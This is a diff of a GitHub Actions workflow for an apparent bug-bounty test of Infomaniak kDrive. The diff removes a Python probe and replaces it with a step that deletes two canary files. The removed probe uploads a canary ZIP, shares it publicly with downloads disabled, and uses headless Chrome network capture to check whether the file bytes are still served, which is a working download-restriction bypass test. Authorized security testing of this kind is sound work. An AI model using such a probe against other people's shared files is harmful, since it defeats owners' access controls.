@@ -1,4 +1,4 @@
-name: kDrive no-download share probe
+name: kDrive share canary cleanup
 
 on:
   push:
@@ -8,112 +8,21 @@ permissions:
   contents: read
 
 jobs:
-  zip-share-probe:
+  cleanup:
     runs-on: ubuntu-latest
     env:
       KDRIVE_TOKEN: ${{ secrets.KDRIVE_TOKEN }}
     steps:
-      - name: Install browser probe dependencies
-        run: python -m pip install --quiet requests selenium
-
-      - name: Test non-preview ZIP share with download disabled
+      - name: Remove only controlled canary files
         shell: python
         run: |
-          import base64, io, json, os, sys, time, zipfile
-          from urllib.parse import urlparse
-          import requests
-          from selenium import webdriver
-          from selenium.webdriver.chrome.options import Options
-
+          import os, requests
           token=os.environ.get('KDRIVE_TOKEN','')
-          if not token: print('[STOP] missing token'); sys.exit(2)
+          if not token: raise SystemExit('missing token')
           print(f'::add-mask::{token}')
-          drive_id=3896576
-          directory_id=5
-          ua='kDrive-YWH-share-canary/1.0 Infomaniak-YWH-Bugbounty'
-          auth={'Authorization':f'Bearer {token}','User-Agent':ua,'Accept':'application/json'}
-
-          now=int(time.time())
-          marker=f'KDRIVE-YWH-ZIP-NODOWNLOAD-{now}'.encode()
-          bio=io.BytesIO()
-          with zipfile.ZipFile(bio,'w',zipfile.ZIP_DEFLATED) as z:
-              z.writestr('canary.txt', marker)
-          payload=bio.getvalue()
-          filename=f'ywh-nodownload-binary-{now}.zip'
-
-          up=requests.post(f'https://api.infomaniak.com/3/drive/{drive_id}/upload',
-              headers={**auth,'Content-Type':'application/zip'},
-              params={'directory_id':str(directory_id),'file_name':filename,'total_size':str(len(payload)),'conflict':'error'},
-              data=payload,timeout=60)
-          try: uo=up.json()
-          except Exception: print(f'[STOP] upload HTTP={up.status_code} non_json');sys.exit(0)
-          if uo.get('result')!='success':
-              e=uo.get('error') or {};print(f"[STOP] upload HTTP={up.status_code} result={uo.get('result')} code={e.get('code')}");sys.exit(0)
-          file_id=(uo.get('data') or {}).get('id')
-          print(f'[UPLOAD] HTTP={up.status_code} file_id={file_id} zip_bytes={len(payload)}')
-          if not file_id: sys.exit(0)
-
-          sh=requests.post(f'https://api.infomaniak.com/2/drive/{drive_id}/files/{file_id}/link',
-              headers={**auth,'Content-Type':'application/json'},
-              json={'right':'public','can_download':False,'can_edit':False,'can_request_access':False},timeout=60)
-          try: so=sh.json()
-          except Exception: print(f'[STOP] share HTTP={sh.status_code} non_json');sys.exit(0)
-          sd=so.get('data') or {}; caps=sd.get('capabilities') or {}; share_url=sd.get('url')
-          print(f"[SHARE] HTTP={sh.status_code} result={so.get('result')} can_download={str(caps.get('can_download')).lower()} right={sd.get('right')}")
-          if not share_url or caps.get('can_download') is not False:
-              print('[STOP] no valid no-download public share');sys.exit(0)
-          print(f'::add-mask::{share_url}')
-          print(f'[SHARE] host={urlparse(share_url).hostname} url_redacted=true')
-
-          opts=Options()
-          opts.add_argument('--headless=new');opts.add_argument('--no-sandbox');opts.add_argument('--disable-dev-shm-usage');opts.add_argument('--disable-gpu')
-          opts.set_capability('goog:loggingPrefs',{'performance':'ALL'})
-          driver=webdriver.Chrome(options=opts)
-          exact_download=False
-          saw_download_200=False
-          observations=[]
-          try:
-              driver.execute_cdp_cmd('Network.enable',{})
-              driver.get(share_url)
-              time.sleep(8)
-              logs=driver.get_log('performance')
-              for entry in logs:
-                  try: msg=json.loads(entry['message'])['message']
-                  except Exception: continue
-                  if msg.get('method')!='Network.responseReceived': continue
-                  p=msg.get('params') or {}; resp=p.get('response') or {}; url=resp.get('url') or ''
-                  parsed=urlparse(url); path=(parsed.path or '').lower(); status=int(resp.get('status') or 0)
-                  if 'download' not in path: continue
-                  print(f'::add-mask::{url}')
-                  headers={str(k).lower():str(v) for k,v in (resp.get('headers') or {}).items()}
-                  disp=headers.get('content-disposition','')
-                  mime=resp.get('mimeType') or ''
-                  body_match=False; body_len=-1
-                  if status==200:
-                      saw_download_200=True
-                      rid=p.get('requestId')
-                      try:
-                          rb=driver.execute_cdp_cmd('Network.getResponseBody',{'requestId':rid})
-                          raw=rb.get('body','')
-                          if rb.get('base64Encoded'):
-                              b=base64.b64decode(raw)
-                          else:
-                              b=raw.encode('utf-8')
-                          body_len=len(b);body_match=(b==payload)
-                          if body_match: exact_download=True
-                      except Exception:
-                          pass
-                  observations.append((parsed.hostname,status,mime,'attachment' in disp.lower(),body_len,body_match))
-          finally:
-              driver.quit()
-
-          print(f'[BROWSER] download_responses={len(observations)} saw_download_200={str(saw_download_200).lower()} exact_zip_bytes={str(exact_download).lower()}')
-          for i,(host,status,mime,attachment,body_len,match) in enumerate(observations[:10],1):
-              print(f'[NETWORK {i}] host={host} HTTP={status} mime={mime} attachment={str(attachment).lower()} captured_bytes={body_len} exact_zip={str(match).lower()}')
-
-          if exact_download:
-              print('[RESULT] STRONG_NODOWNLOAD_BYPASS_BROWSER_RECEIVED_EXACT_ZIP_BYTES')
-          elif saw_download_200:
-              print('[RESULT] DOWNLOAD_ENDPOINT_USED_BUT_EXACT_ZIP_BODY_NOT_CONFIRMED')
-          else:
-              print('[RESULT] NO_DOWNLOAD_ENDPOINT_SUCCESS_FOR_ZIP')
+          h={'Authorization':f'Bearer {token}','User-Agent':'kDrive-YWH-cleanup/1.0 Infomaniak-YWH-Bugbounty','Accept':'application/json'}
+          for file_id in (17,18):
+              r=requests.delete(f'https://api.infomaniak.com/2/drive/3896576/files/{file_id}',headers=h,timeout=30)
+              try:o=r.json()
+              except Exception:o={}
+              print(f'[CLEANUP] file_id={file_id} HTTP={r.status_code} result={o.get("result")}')
